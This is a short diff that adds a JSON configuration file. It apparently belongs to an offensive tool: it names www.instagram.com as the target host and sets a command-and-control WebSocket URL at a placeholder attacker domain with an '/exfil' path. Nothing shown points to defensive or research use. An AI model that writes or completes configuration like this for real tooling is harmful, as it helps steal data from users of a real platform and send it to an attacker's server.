@@ -1,0 +1,4 @@
+{
+  "target_host": "www.instagram.com",
+  "c2_ws_url": "wss://c2.your-server.com/exfil"
+}
